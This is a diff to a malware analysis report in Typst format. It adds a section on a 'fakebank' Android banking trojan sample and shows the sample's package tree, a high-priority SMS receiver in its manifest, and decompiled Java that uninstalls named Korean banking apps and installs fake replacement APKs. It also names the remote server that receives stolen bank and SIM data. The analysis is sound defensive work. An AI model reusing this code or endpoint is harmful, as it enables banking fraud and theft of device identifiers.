@@ -71,7 +71,7 @@ Since the structure, behavior, Java code, and general characteristics of the fou
 
 == `4aec` APK (Static analysis)
 
-
+#label("4aec-apk-static-analysis")
 
 === Detection
 #v(0.5em)
@@ -277,6 +277,121 @@ JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivit
 Then it sends all the information to a *remote server* (`http://banking1.kakatt.net:9998/send_bank.php`).
 
 #pagebreak()
+
+== 1911 APK (Static analysis)
+
+This sample appears to differ from the others in its family. The source code reveals additional packages and classes that do not seem to be used.
+In this section, we will examine these differences and explore the extra features included in the sample.
+
+#v(0.5em)
+```ssh_config
+├── bankmanager
+│   ├── BankActivity.java
+│   ├── BankEndActivity.java
+│   ├── BankInfo.java
+│   ├── BankNumActivity.java
+│   ├── BankPreActivity.java
+│   ├── BankScardActivity.java
+│   └── BankSplashActivity.java
+├── contactmanager
+│   ├── Contact.java
+│   └── ContactDAO.java
+├── service
+│   └── InstallService.java
+└── smsmanager
+    ├── AlarmReceiver.java
+    ├── BootCompleteBroadcastReceiver.java
+    ├── BuildConfig.java
+    ├── MainActivity.java
+    ├── MessageActivity.java
+    ├── R.java
+    ├── SmsSystemManageService.java
+    └── smsReceiver.java
+```
+
+As we can see from the tree structure above, The `APK` contains several additional packeges and classes compared to the previous samples. 
+
+In particular `MainActivity.java` into the `smsmanager` package add some noticeable malware features:
+#v(0.5em)
+- Install other `APKs` (other `fakebank` malware like the ones analyzed in @4aec-apk-static-analysis):
+```java
+public void removeApplications() {
+        PackageManager manager = getPackageManager();
+        Intent mainIntent = new Intent("android.intent.action.MAIN", (Uri) null);
+        mainIntent.addCategory("android.intent.category.LAUNCHER");
+        List<ResolveInfo> apps = manager.queryIntentActivities(mainIntent, 0);
+        Collections.sort(apps, new ResolveInfo.DisplayNameComparator(manager));
+        if (apps != null) {
+            int count = apps.size();
+            for (int i = 0; i < count; i++) {
+                new ApplicationInfo();
+                ResolveInfo info = apps.get(i);
+                ApplicationInfo pmAppInfo = info.activityInfo.applicationInfo;
+                ApplicationInfo applicationInfo = info.activityInfo.applicationInfo;
+                if ((pmAppInfo.flags & 1) > 0) {
+                    StringBuilder sb = new StringBuilder();
+                    ApplicationInfo applicationInfo2 = info.activityInfo.applicationInfo;
+                    Log.i("appInfo", sb.append(1).toString());
+                } else {
+                    String str = info.activityInfo.applicationInfo.packageName;
+                    if (str.equals("com.hanabank.ebk.channel.android.hananbank")) {
+                        Log.d("find app", "----com.hanabank.ebk.channel.android.hananbank--");
+                        unInstallApp(str);
+                        File file = new File("/sdcard/apk/hannanbank.apk");
+                        if (file.exists()) {
+                            installApk(file.getAbsolutePath());
+                        }
+                    } else if (str.equals("com.ibk.spbs")) {
+                        Log.d("find app", "----com.ibk.spbs--");
+                        unInstallApp(str);
+                        File file2 = new File("/sdcard/apk/ibk.apk");
+                        if (file2.exists()) {
+                            installApk(file2.getAbsolutePath());
+                        }
+                    } else if (str.equals("com.kbcard.kbkookmincard")) {
+                        Log.d("find app", "----com.kbcard.kbkookmincard--");
+                        unInstallApp(str);
+                        File file3 = new File("/sdcard/apk/kb.apk");
+                        if (file3.exists()) {
+                            installApk(file3.getAbsolutePath());
+                        }
+                    } else if (str.equals("com.shinhan.sbanking")) {
+                        Log.d("find app", "----com.shinhan.sbanking--");
+                        unInstallApp(str);
+                        File file6 = new File("/sdcard/apk/xinhan.apk");
+                        if (file6.exists()) {
+                            installApk(file6.getAbsolutePath());
+                        }
+                    }
+                }
+            }
+        }
+    }
+```
+Removing also the installed applications if existent.
+#v(0.5em)
+- Send sensitive information like the phone number, IMSI, and SIM serial number to a remote server. (like the previous sample @4aec-apk-static-analysis) 
+#v(1em)
+Anyway as we can se from the manifest:
+```xml
+<activity android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" android:label="@string/app_name" android:name="com.example.bankmanager.BankSplashActivity" android:screenOrientation="portrait">
+  <intent-filter>
+      <action android:name="android.intent.action.MAIN" />
+      <category android:name="android.intent.category.LAUNCHER" />
+  </intent-filter>
+</activity>
+<!-- ... -->
+<receiver android:name=".smsReceiver">
+    <intent-filter android:priority="1000">
+        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</receiver>
+```
+#v(0.5em)
+The `MainActivity` is not the starting point of the application. The real main activity is `BankSplashActivity`, that following the flow end his execution in `BankEndActivity` not passing in any way from the `MainActivity`. Also the Broadcast Receiver is not the one of the `MainActivity` but the one of the `smsReceiver` package.
+#pagebreak()
+
 
 = RansomLoc family
 
